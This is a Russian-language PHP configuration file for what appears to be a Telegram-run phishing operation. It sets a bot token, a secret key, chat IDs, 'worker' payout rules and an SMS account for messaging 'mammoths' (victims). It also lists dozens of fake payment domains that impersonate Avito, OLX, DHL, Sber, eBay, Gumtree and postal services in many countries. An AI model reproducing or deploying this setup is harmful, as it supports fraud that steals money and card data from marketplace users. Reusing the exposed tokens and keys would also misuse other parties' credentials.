<?php
	function liveChatCode() { // Код для поддержки на сайтах
		return "
			<script type='text/javascript'>
			var _smartsupp = _smartsupp || {};
			_smartsupp.key = '03bd77a86692bef6b2d8c0c6d374c9d58d292ebb';
			window.smartsupp||(function(d) {
			var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
			s=d.getElementsByTagName('script')[0];c=d.createElement('script');
			c.type='text/javascript';c.charset='utf-8';c.async=true;
			c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
			})(document);
			</script>
		";
	}

	function getRules() { // Правила проекта
		return [
			'1. <b>Запрещена</b> реклама, спам, флуд, ШОК контент, порно',
			'2. <b>Запрещено</b> попрошайничество',
			'',
			'ТC не несет ответственности за блокировку кошельков / карт',
			'Профит воркера, не состоящего в конфе не будет выплачен',
			'',
			'💁🏼‍♀️ Вы <b>подтверждаете</b>, что ознакомились и согласны с условиями и правилами нашего проекта?',
		];
	}

	function serviceRecvSms() { // Выбор сервиса для получение смс для Avito,Youla.
		return 'shb';
	}
	
	function authSmsRecv($a) { // Токен из SMSHUB для получения смс для Avito,Youla.
		return [
			'shb' => '',
		][$a];
	}

	function authSmsSend($a) { // Логин и пароль от SMSCAB для отправки СМС мамонтам.
		return [
			'login' => '',
			'password' => '',
		][$a];
	}

	function projectAbout($a) { // Информации о проекте
		return [
			/* Общая информация о проекте: */
			'botLogin' => 'MINIMALL ', // Тег бота без собачки
			'projectName' => ' MINIMALL TEAM', // Название проекта
			'dataopen' => '12 декабря 2020', // Дата открытия проекта, свой текст
			/* Состав проекта: */
			'owner1' => 'Owner_kek',
			'coder1' => 'Owner_kek',
		][$a];
	}

	function linkChat() { // Ссылка на чат
		return 'https://t.me/+kXcKa7OSGgA5N2Ey';
	}
	
	function linkPays() { // Ссылка на канал выплат
		return 'https://t.me/+B71ORVC-VAk5MDcy';
	}

	function kickNotRegisterUser() { // Кик участника если он не зарегистрирован в боте
		return false; // true - Включено, false - Выключено
	}

	function secretKey() { // Секретный ключ для передачи данных между сайтами и ботом.
		return 'LW3na6te4P28SWU4x642LvMC';
	}

	function allDomains() { // Список доменов для сервисов
		return [
			1 => ['liqu-pay.com/shawtycorp/fakes/avito'], // Авито
			2 => ['youla.rfs-pay.ru'], // Юла
			3 => ['boxberry.rfs-pay.ru'], // БоксБерри
			4 => ['cdek.rfs-pay.ru'], // Сдэк
			5 => ['pochta.rfs-pay.ru'], // Почта РФ
			6 => ['pecom.rfs-pay.ru'], // ПЭК
			7 => ['yandex.rfs-pay.ru'], // Яндекс
			8 => ['dostavista.rfs-pay.ru'], // Достависта
			9 => ['rent.rfs-pay.ru'], // Аренда Авито/Юла
			10 => ['ponyexpress.rfs-pay.ru'], // Пониэкспресс
			11 => ['dhl.rfs-pay.ru'], // DHL
			12 => ['blablacar.pay-sacure4ds.ru'], // Блабакар
			13 => ['youla-rent.rfs-pay.ru'], // Аренда Юла
			14 => ['cian-rent.rfs-pay.ru'], // Аренда Циан
			15 => ['olxpl.pay-sacure4ds.ru'], // Польша OLX
			16 => ['olxua.pay-sacure4ds.ru'], // Украина OLX
			17 => ['olxkz.pay-sacure4ds.ru'], // Казахстан OLX
			18 => ['novaposhta.rfs-pay.ru'], // НоваПошта
			19 => ['o-yandex.rfs-pay.ru'], // Яндекс объявления
			20 => ['999md.pay-sacure4ds.ru'], // Молдова OLX
			21 => ['olxro.pay-sacure4ds.ru'], // Румыния OLX
			22 => ['sber.rfs-pay.ru'], // Sber чек
			23 => ['raiffeisen.rfs-pay.ru'], // Raiffeisen чек
			24 => ['blablacarua.pay-sacure4ds.ru'], // Блабакар UA
			
			25 => ['olx-bg.rfs-pay.ru'], // Болгария OLX
			26 => ['olxuz.pay-sacure4ds.ru'], // Узбекистан OLX
			27 => ['gumtreeuk.pay-sacure4ds.ru'], // Англия Gumtree
			28 => ['gumtreeau.pay-sacure4ds.ru'], // Австралия Gumtree
			29 => ['mvideo.rfs-pay.ru'], // MVideo
			//30 => ['market-kz.rfs-pay.ru'], // Казахстан MARKET KZ
			//31 => ['izi-ua.rfs-pay.ru'], // Украина IZI
			32 => ['olxpt.pay-sacure4ds.ru'], // КаспиБанк KZ
			33 => ['olxpt.pay-sacure4ds.ru'], // Португалия OLX
			34 => ['subito.pay-sacure4ds.ru'], // Subito Италия
			//35 => ['allegro.rfs-pay.ru'], // Allegro Польша
			//НОВЫЕ СТРАНЫ
			36 => ['leboncoin.pay-sacure4ds.ru'], //LEBONCOIN ФРАНЦИЯ
			37 => ['quoka.pay-sacure4ds.ru'], //QUOKA DE ГЕРМАНИЯ
			38 => ['ebayeu.pay-sacure4ds.ru'], //EBAY EU ЕВРОПА
			39 => ['ricardo.pay-sacure4ds.ru'], //RICARDO КАНАДА
			40 => ['dhleu.pay-sacure4ds.ru'], //DHL EU ЕВРОПА
			41 => ['milanuncios.pay-sacure4ds.ru'], //MILANUNCIOS ИСПАНИЯ
			42 => ['correos.pay-sacure4ds.ru'], //CORREOS ИСПАНИЯ
			43 => ['jofogas.pay-sacure4ds.ru'], //JOFOGAS ВЕНГРИЯ
			44 => ['tori.pay-sacure4ds.ru'], //TORI ФИНЛЯНДИЯ
  45 => ['quoka.formaa.ga'], //bazar cz

		];
	}

	function botToken() {
		return '5332642035:AAGnyXk6hu1jHHNoIIm6FNqcBKOiByi2Oj0';
	}
	
	function chatGroup() {
		return '-644799724';
	}
	
	function chatAdmin() {
		return '-600845265';
	}
	
	function chatAlerts() {
		return '-1001567402646';
	}
	
	function chatProfits() {
		return  '-1001615813317';
	}

	function activateRuchka() {
		return 20000;
	}
	
	function showUserCard() {
		return false;
	}

	function accessSms() {
		return [0, 0];
	}

	function imgurId() {
		return '9783c0d302010a0';
	}
	
	function chatAdmin2() {
		return '-792577142';
	}
	// Стикеры в сообщениях бота
    function Stickers($a) { 
		return [
		    //Стикеры сообщений(ID стикера можно узнать при помощи - @idsticker_bot)
		    'joinproject' => 'CAACAgQAAxkBAAEDvXBh7h98S6FJYioKNFWrGj4dQynsMwACwgEAAnqwTQvvfbM5aiw6RiME', //Стикер при первой запуске бота
		    'TC' => 'CAACAgIAAxkBAAEDWUxhnXRlhtVIgQQUzXRuJe_c2dk3BwACshIAA3VJSlVDVklAPgmCIgQ', //Стикер кнопки ТС
		    'additem31' => 'CAACAgIAAxkBAAEDmtth015rV4GSOZERxZUuymggSUXfiAACYgAD29t-AAGOFzVmmxPyHCME', //Стикер при создании объявы.
		    'status' => 'CAACAgIAAxkBAAEDKrhheT1qUlhDMpXNnjhMHUgwpcgDpwACPAADZ8j4IsoxgAUGiv9GIQQ', //Стикер "Правила проекта" при заявке.
		    'menubar' => 'CAACAgIAAxkBAAEDuTlh6cdQMbGYjYY3FA_DH2TycPfoxQACoA0AAtWVSEotC3zdflVQMCME', //Стикер "Правила проекта" при заявке.
		    'joinwait' => 'CAACAgIAAxkBAAEDmt1h0156vxESjKRnxCmf6tehz09G_QACYQAD29t-AAH39w-bN-rU5CME', //Стикер при отправке заявки на вступление.
		    'accessblock' => 'CAACAgIAAxkBAAEDWaFhnb_GYPg8QVOraDYPUDjC2w27iAACPhMAAjTBGUvmXwQDTi-dHyIE', //Стикер если нет доступа.
		][$a];
	}
?>
?>
